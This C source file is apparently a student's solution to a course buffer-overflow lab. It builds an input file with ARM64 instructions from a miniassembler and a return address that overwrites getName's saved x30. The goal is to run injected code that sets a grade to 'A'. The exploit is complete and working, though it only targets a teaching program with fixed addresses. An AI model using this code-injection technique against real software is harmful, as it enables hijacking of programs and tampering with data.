#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include "miniassembler.h"

int main(void){
    int i;
    FILE *psFile;
    unsigned long ulData;
    unsigned int adr;
    unsigned int mov;
    unsigned int strb;
    unsigned int b;

    /* adr x1, [sp, grade] */
    adr = MiniAssembler_adr(1, 0x420044, 0x42006C);
    /* mov w0, "A" */
    mov = MiniAssembler_mov(0, 0x000041);
    /* strb w0, [x1] */
    strb = MiniAssembler_strb(0, 1);
    /* b printf */
    b = MiniAssembler_b(0x400864, 0x420074);
    psFile = fopen("dataA", "w");
    
    /* address of first machine language instruction in bss */
    ulData=0x420068;

    /* puts Chris Paucar in the first 12 spots of text file */
    fprintf(psFile,"Chris Paucar");

    for(i = 0; i < 4; i++){
        putc('\0', psFile);
    }
    
    /* puts machine language intructions in text file */
    fwrite(&mov, sizeof(unsigned int), 1, psFile);
    fwrite(&adr, sizeof(unsigned int), 1, psFile);
    fwrite(&strb, sizeof(unsigned int), 1, psFile);
    fwrite(&b, sizeof(unsigned int), 1, psFile);

    /* fills rest of text file with null bytes */
    for(i = 0; i < 16; i++){
        putc('\0', psFile);
    }
    
    /* overwrite x30 of getName with first machine language instruction */
    fwrite(&ulData, sizeof(unsigned long), 1, psFile);
    fclose(psFile);
    
    return 0;
}
